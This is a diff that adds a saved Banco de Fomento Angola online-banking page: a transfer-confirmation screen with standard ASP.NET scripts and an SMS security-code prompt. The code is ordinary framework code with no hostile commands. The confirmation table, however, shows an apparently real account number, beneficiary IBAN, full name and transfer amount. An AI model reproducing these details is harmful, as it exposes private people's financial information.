+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['aspnetForm'];
+if (!theForm) {
+    theForm = document.aspnetForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=LD12WBJOM1ceRGdAoRGjZVCAwNk7PzJ4WC3b28cMK3SbJf4rupoUhNv2emGhV5TGbRCyQKDFkHv_ItFd2-U9mEHx4am1MyHGXn3Y0lHFze81&amp;t=638240379755514788" type="text/javascript"></script>
+
+
+<script src="/WebResource.axd?d=WNTxFN_Z1ATQAt759xPl_ifq_Tm7h-E1Upu6Q0Z2JLkTzZmaAUz3zBLCC3jBBIPZj52-SnUqpL5OLaeOYeyGXzfZjUQrhMOPePkmX4R9ddc1&amp;t=638240379755514788" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+<table class="resumeTable" border="1px"><tr><td colspan="2" class="labelHeader">Confirme os dados</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_drop_originAccount">Conta a debitar</label></td><td>17328156330001 - Dep&#243;sito Ordem - AKZ</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_transfer_value">Valor a transferir</label></td><td>90.000,00&nbsp;AKZ&nbsp;</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_iban">IBAN do beneficiário</label></td><td>AO06004000001309481910115</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_beneficiary_name">Nome do beneficiário</label></td><td>Clesia Maria Catungui Jungo&nbsp;</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_payment_detail">Detalhes do pagamento (facultativo)</label></td><td>&nbsp;</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_drop_reasonType">Motivo</label></td><td>Pagamentos</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_drop_transferType">Tipo de transferência</label></td><td>Eventual</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_radio_transferDate">Data de transferência</label></td><td></td></tr><tr><td class="bckgrnd"><label>Data de vencimento</label></td><td></td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_drop_transferPeriod">Periodicidade</label></td><td></td></tr><tr><td><span>&nbsp;</span></td><td></td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_drop_notificBen">Notificar beneficiário</label></td><td>N&#227;o</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_email_notification">E-mail do beneficiário</label></td><td>&nbsp;</td></tr><tr><td class="bckgrnd" width="50%"><label for="ctl00_ctl00_dynControl_msg_text">Mensagem para o beneficiário</label></td><td>&nbsp;</td></tr></table>
+    <div id="ctl00_ctl00_smsMessage" class="confMessage">
+        <br />
+        <span>Foi enviado um SMS com um código de segurança para o seguinte número: *******14 </br>Por favor insira-o para continuar:</span>
+        &nbsp;<input name="ctl00$ctl00$SMSConfirmationCode" type="text" id="ctl00_ctl00_SMSConfirmationCode" style="width:111px;" />
+        <span id="ctl00_ctl00_ctl02" style="color:Red;display:none;">*</span>
+        <br />
+        <br />
+        <div id="ctl00_ctl00_buttonDiv1" class="tableButtons">
+            <input type="submit" name="ctl00$ctl00$SendConfOTPButton" value="Confirmar" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ctl00$SendConfOTPButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="ctl00_ctl00_SendConfOTPButton" class="button" />
+            <input type="submit" name="ctl00$ctl00$ResendConfOTPButton" value="Reenviar SMS" id="ctl00_ctl00_ResendConfOTPButton" class="button" />
+            <input type="button" class="button" value='Voltar'
+            onclick="javascript:forms['backform'].action = document.referrer; forms['backform'].submit();" />
+        </div>
+        <span>Caso não receba a SMS no prazo de 45 segundos, clique em reenviar SMS ou para mais informações contacte a Linha de Apoio ao Cliente BFA 923 120 120.</span>
+    </div>
+    
+    
+    <div id="loginKeyboard">
+        
+        
+        <span id="ctl00_ctl00_Span2">
+            <script type="text/javascript">
+                var confField = 'ctl00_ctl00_ConfBox';
+            </script>
+        </span>
+    </div>
+    
+
+        <div id="ctl00_ctl00_errorMessageAjax" style="display:none;">
+            <div class="errorMessage">
+                <div class="errorTitle">
+                    <h1>
+                        <img src="/img/warning.gif" alt="Erro" />
+                        A operação não foi realizada.
+                    </h1>
+                </div>
+                <ul>
+                    <li>
+                        <h2 id="errorBF02Ajax">
+                        </h2>
+                    </li>
+                </ul>
+            </div>
+            <div id="buttonDivAjax" class="tableButtons">
+                <input type="button" class="button" value='Voltar'
+                    onclick="javascript: forms['backform'].action = document.referrer; forms['backform'].submit();" />
+            </div>
+        </div>
+        <div id="processingDiv" style='display:none; background: none repeat scroll 0 0 black; bottom: 0; height: 100%; left: 0; opacity: 0.5; -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=50)"; filter: alpha(opacity=50); position: fixed; top: 0; width: 100%; z-index: 200;'>
+	        <div id="processingDivChild">
+		        <center><img id="waitgif" style="margin-top:30%;margin-bottom:30%;" src="" alt="" /></center>
+		        <div style=""></div>
+	        </div>
+        </div>
+    
+    
+        <div id="ctl00_ctl00_AjaxSuccessPanel" class="successMessage" style="display: none;">
+            <div class="successTitle">
+                <h1>
+                    Operação realizada com sucesso.
+                </h1>
+            </div>
+        </div>
+    
+    
+    <div>
+        
+        
+        
+        <div style='display:none'>
+            <div id="compPrint" class="tableButtons">
+                <input type="button" class="button" onclick="javascript:printComprovativo();" value='Guardar/Imprimir comprovativo' />
+                
+            </div>
+        </div>
+
+
+    </div>
+    
+    
+
+      
+
+    
+    
+<script type="text/javascript">
+//<![CDATA[
+var Page_ValidationSummaries =  new Array(document.getElementById("ctl00_ctl00_dynControl_ctl00"));
+var Page_Validators =  new Array(document.getElementById("ctl00_ctl00_ctl02"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var ctl00_ctl00_ctl02 = document.all ? document.all["ctl00_ctl00_ctl02"] : document.getElementById("ctl00_ctl00_ctl02");
+ctl00_ctl00_ctl02.controltovalidate = "ctl00_ctl00_SMSConfirmationCode";
+ctl00_ctl00_ctl02.display = "Dynamic";
+ctl00_ctl00_ctl02.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ctl00_ctl00_ctl02.initialvalue = "";
+//]]>
+</script>
+
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="47839990" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        //]]>
+</script>
+</form>
+
+    <form id="backform" method="post" action="">
+        
+    </form>
+
+    
+</div>
+
+	    </div>
+	    
+	  </div>
+	</div>
+    
+
+<div id="contactosHP">
+    <hr />
+        <div id="contactoFooter">
+            <span id="ctl00_ctl01_contactos1">E-mail: <a href="mailto:bfa.net@bfa.ao">bfa@bfa.ao</a>    Linha de Atendimento BFA: (+244) 923 120 120   Contacte-nos: <a href="/Servicos/contacto_HB.aspx?idc=398">Formulário</a></span>
+        </div>
+        
+        <!-- Language Flags -->
+        <div id="flags">
+            
+    
+    <span
+        class="selected"  >
+        <a> Português</a>
+    </span>
+
+    
+    <span
+        style="display:none"  >
+        <a href="/Login/login_detail.aspx?idl=1"> Português</a>
+    </span>
+  
+    
+    <span
+        style="display:none"  >
+        <a> English</a>
+    </span>
+
+    
+    <span
+         >
+        <a href="/Login/login_detail.aspx?idl=2"> English</a>
+    </span>
+  
+ 
+        </div>
+    <hr />
+</div>
+<ul class="ckk"></ul>
+<div id="footerCx">
+  
+        <div id="fmenu">
+          <ul>
+      
+          </ul>
+        </div><!--fmenu-->
+      
+   
+   <div id="creditosCx">    
+      
+            <div id="creditosSponsor">
+          
+            </div><!--creditosSponsor-->
+          
+      <div id="creditos2">
+          <P>© 2013 Banco de Fomento Angola</P>
+      </div><!--creditos2-->
+  </div><!--creditosCx-->
+</div><!--footerCx-->
+</body></html>
